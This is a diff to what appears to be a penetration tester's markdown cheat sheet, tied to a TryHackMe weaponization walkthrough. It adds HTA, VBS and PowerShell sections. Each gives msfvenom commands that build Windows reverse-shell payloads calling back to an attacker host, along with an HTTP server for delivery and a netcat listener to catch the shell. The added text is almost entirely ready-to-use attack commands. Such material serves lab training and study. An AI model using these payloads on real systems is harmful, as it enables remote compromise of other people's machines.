@@ -84,6 +84,77 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.179.48  LPORT=1337 — pla
 
 
 
+## HTA
+
+**Examples**
+
+[weaponization.md](../walkthroughs/tryhackme/weaponization.md "mention")
+
+**Kali #1**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f hta-psh -o thm.hta
+python2 -m SimpleHTTPServer 81
+```
+
+**Kali #2**
+
+```
+rlwrap nc -lvnp 443
+```
+
+
+
+### VBS
+
+**Examples**
+
+[weaponization.md](../walkthroughs/tryhackme/weaponization.md "mention")
+
+**Kali #1**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vbs -o exploit.vbs
+```
+
+**Kali #2**
+
+```
+rlwrap nc -lvnp 443
+```
+
+### DOC
+
+**Examples**
+
+[weaponization.md](../walkthroughs/tryhackme/weaponization.md "mention")
+
+### PS1
+
+**Kali #1**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f psh -o exploit.ps1
+```
+
+**Kali #2**
+
+```
+rlwrap nc -lvnp 443
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 **Python Bind Shell**
 
 ```
